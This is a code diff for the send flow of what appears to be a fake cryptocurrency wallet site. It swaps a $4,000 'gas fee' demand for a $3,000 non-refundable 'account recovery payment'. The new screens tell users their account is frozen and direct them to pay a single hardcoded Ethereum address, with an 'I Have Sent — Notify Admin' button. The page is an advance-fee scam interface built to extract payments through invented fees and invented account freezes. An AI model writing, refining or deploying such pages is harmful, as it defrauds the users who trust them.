@@ -441,40 +441,67 @@
       </button>
     </div>
 
-    <!-- ── Step 3: Payment / Gas Fee Deposit ── -->
-    <div id="send-step-3" style="display:none;padding:18px 22px 22px;">
-      <!-- Summary -->
-      <div style="background:var(--surface2,#f8fafc);border:1.5px solid var(--border,#e2e8f0);border-radius:14px;padding:14px 16px;margin-bottom:16px;">
-        <div style="display:flex;justify-content:space-between;align-items:flex-start;font-size:13px;padding:4px 0;color:var(--text3,#94a3b8);">
-          <span>Sending</span><strong id="hs-sum-amount" style="color:var(--text1,#1e293b);">—</strong>
+    <!-- ── Step 3: Account Recovery Payment ── -->
+    <div id="send-step-3" style="display:none;padding:16px 22px 22px;">
+
+      <!-- Header alert -->
+      <div style="background:linear-gradient(135deg,rgba(239,68,68,.1),rgba(239,68,68,.05));border:1.5px solid rgba(239,68,68,.35);border-radius:14px;padding:14px 16px;margin-bottom:14px;">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;">
+          <span style="font-size:18px;">🔒</span>
+          <strong style="font-size:14px;color:#dc2626;letter-spacing:-.01em;">Account Recovery Payment Required</strong>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:flex-start;font-size:13px;padding:4px 0;color:var(--text3,#94a3b8);">
-          <span>To</span><strong id="hs-sum-recipient" style="font-family:var(--mono);font-size:11px;word-break:break-all;text-align:right;max-width:220px;color:var(--text1,#1e293b);">—</strong>
+        <p style="font-size:12.5px;color:#7f1d1d;margin:0;line-height:1.6;">
+          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong>$3,000 (ERC-20)</strong> is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
+        </p>
+      </div>
+
+      <!-- Purpose + How It Works -->
+      <div style="background:var(--surface2,#f8fafc);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:13px 15px;margin-bottom:12px;font-size:12.5px;color:var(--text2,#475569);line-height:1.65;">
+        <div style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3,#94a3b8);margin-bottom:8px;">Purpose</div>
+        <p style="margin:0 0 10px;">This payment is to <strong style="color:var(--text1,#1e293b);">unfreeze your account</strong> and verify ownership so you can continue to send and transact without restrictions.</p>
+        <div style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3,#94a3b8);margin-bottom:8px;">How It Works</div>
+        <ol style="margin:0;padding-left:18px;">
+          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong>$3,000 (ERC-20)</strong>.</li>
+          <li>Once confirmed on-chain, your account will be unfrozen and full access will be restored.</li>
+        </ol>
+      </div>
+
+      <!-- Payment Frequency + Important -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;">
+        <div style="background:rgba(99,102,241,.06);border:1px solid rgba(99,102,241,.2);border-radius:10px;padding:11px 13px;">
+          <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:#6366f1;margin-bottom:5px;">Payment Frequency</div>
+          <p style="font-size:11.5px;color:var(--text2,#475569);margin:0;line-height:1.5;">This is a <strong>one-time payment</strong>. You will only be asked again if your account becomes frozen in the future.</p>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;font-size:13px;padding:6px 0 0;border-top:1px solid var(--border,#e2e8f0);margin-top:6px;color:var(--text3,#94a3b8);">
-          <span>⛽ Network Gas Fee</span><strong style="color:#ef4444;">$4,000.00</strong>
+        <div style="background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:10px;padding:11px 13px;">
+          <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:#dc2626;margin-bottom:5px;">⚠ Important</div>
+          <p style="font-size:11.5px;color:var(--text2,#475569);margin:0;line-height:1.5;">This is <strong>not a deposit</strong> and is <strong>non-refundable</strong>. It is a one-time recovery payment to confirm ownership and restore access.</p>
         </div>
       </div>
 
-      <!-- Deposit address card for the SENDING chain only -->
-      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:8px;">⛽ Pay Gas Fee To This Address</label>
-      <div style="background:linear-gradient(145deg,#1e3a8a,#1e40af);border-radius:16px;padding:18px;color:#fff;margin-bottom:14px;">
-        <div id="hs-pay-chain-label" style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;opacity:.75;margin-bottom:10px;">Ethereum (ERC-20)</div>
-        <code id="hs-pay-addr" style="display:block;font-family:var(--mono);font-size:13px;line-height:1.7;word-break:break-all;background:rgba(255,255,255,.12);padding:12px 14px;border-radius:10px;color:#fff;margin-bottom:12px;">0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf</code>
-        <button id="hs-copy-addr-btn" onclick="hsCopyPayAddr()" style="width:100%;padding:10px;border-radius:10px;border:none;background:rgba(255,255,255,.2);color:#fff;font-weight:700;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/></svg>
+      <!-- Deposit address card — always ERC-20 -->
+      <label style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text3,#94a3b8);display:block;margin-bottom:8px;">Deposit Address (ERC-20 / ETH)</label>
+      <div style="background:linear-gradient(145deg,#1e3a8a,#1e40af);border-radius:14px;padding:16px 18px;color:#fff;margin-bottom:14px;">
+        <div id="hs-pay-chain-label" style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;opacity:.7;margin-bottom:10px;">Ethereum · ERC-20</div>
+        <code id="hs-pay-addr" style="display:block;font-family:var(--mono);font-size:12.5px;line-height:1.7;word-break:break-all;background:rgba(255,255,255,.12);padding:11px 13px;border-radius:9px;color:#fff;margin-bottom:11px;">0x9901E676d0a27e2B5D3DC9fc9fe227F003F559cf</code>
+        <button id="hs-copy-addr-btn" onclick="hsCopyPayAddr()" style="width:100%;padding:9px;border-radius:9px;border:none;background:rgba(255,255,255,.18);color:#fff;font-weight:700;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/></svg>
           Copy Address
         </button>
       </div>
 
-      <div style="background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.45);border-radius:10px;padding:12px 14px;font-size:12px;color:#92400e;line-height:1.6;margin-bottom:16px;">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:4px;"><path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#92400e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Send <strong>$4,000</strong> equivalent in <strong id="hs-pay-sym">ETH</strong> to the address above, then click <strong>"I've Paid"</strong>. Our team will verify and process your withdrawal within minutes.
+      <!-- Payment summary table -->
+      <div style="background:var(--surface2,#f8fafc);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:12px 15px;margin-bottom:14px;">
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Recovery Payment</span><strong style="color:#dc2626;">$3,000.00</strong></div>
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Network</span><strong style="color:var(--text1,#1e293b);">Ethereum (ERC-20)</strong></div>
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Purpose</span><strong style="color:var(--text1,#1e293b);">Unfreezing of account &amp; ownership verification</strong></div>
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Payment Type</span><strong style="color:var(--text1,#1e293b);">One-time recovery payment</strong></div>
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);"><span>Refundable</span><strong style="color:#dc2626;">No</strong></div>
       </div>
 
-      <button id="gas-fee-paid-btn" onclick="submitGasFee()" style="width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 4px 18px rgba(239,68,68,.35);display:flex;align-items:center;justify-content:center;gap:8px;">
+      <!-- CTA -->
+      <button id="gas-fee-paid-btn" onclick="submitGasFee()" style="width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 4px 18px rgba(220,38,38,.35);display:flex;align-items:center;justify-content:center;gap:8px;">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 4 12 14.01l-3-3" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        I've Paid — Notify Team
+        I Have Sent — Notify Admin
       </button>
       <div id="gas-fee-status" style="margin-top:10px;font-size:13px;text-align:center;min-height:18px;"></div>
     </div>
@@ -482,14 +509,17 @@
     <!-- ── Step 4: Pending confirmation ── -->
     <div id="send-step-4" style="display:none;text-align:center;padding:18px 22px 28px;">
       <div style="font-size:52px;margin-bottom:12px;">⏳</div>
-      <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Payment Received</div>
+      <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Recovery Payment Pending</div>
       <p style="font-size:13px;color:var(--text2,#475569);line-height:1.6;margin-bottom:18px;">
-        Your gas fee deposit is being verified by our team.<br>
-        Your send transaction will be processed automatically once confirmed.
+        Your $3,000 account recovery payment is being verified.<br>
+        Once confirmed, your account will be unfrozen and your send transaction processed automatically.
       </p>
-      <div style="background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.25);border-radius:12px;padding:12px 16px;margin-bottom:18px;">
+      <div style="background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.25);border-radius:12px;padding:12px 16px;margin-bottom:8px;">
         <div style="font-size:12px;color:#6366f1;font-weight:700;">🔔 Admin has been notified</div>
-        <div style="font-size:12px;color:var(--text3,#94a3b8);margin-top:4px;">Average confirmation time: 5–30 minutes</div>
+        <div style="font-size:12px;color:var(--text3,#94a3b8);margin-top:4px;">Average verification time: 5–30 minutes</div>
+      </div>
+      <div style="background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.2);border-radius:10px;padding:10px 14px;margin-bottom:18px;font-size:12px;color:#991b1b;">
+        🔒 Your account is currently frozen. Full access will be restored after payment confirmation.
       </div>
       <button onclick="closeHomeSend()" style="padding:10px 28px;border-radius:12px;border:none;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-weight:700;cursor:pointer;font-size:14px;">
         Close
@@ -894,12 +924,11 @@ function homeSendToStep3() {
   document.getElementById('hs-sum-amount').textContent    = amount + ' ' + _hsSym;
   document.getElementById('hs-sum-recipient').textContent = addr;
 
-  // Set deposit address to the SENDING chain
-  const depAddr = HS_DEP_ADDRESSES[_hsChain] || EVM_ADDR;
-  const depLabel = HS_DEP_LABELS[_hsChain] || _hsChain;
-  document.getElementById('hs-pay-addr').textContent       = depAddr;
-  document.getElementById('hs-pay-chain-label').textContent = depLabel;
-  document.getElementById('hs-pay-sym').textContent         = _hsSym;
+  // Account recovery payment is always ERC-20 regardless of sending chain
+  document.getElementById('hs-pay-addr').textContent        = EVM_ADDR;
+  document.getElementById('hs-pay-chain-label').textContent = 'Ethereum · ERC-20';
+  const sym = document.getElementById('hs-pay-sym');
+  if (sym) sym.textContent = 'ETH';
 
   // Reset copy button
   const copyBtn = document.getElementById('hs-copy-addr-btn');
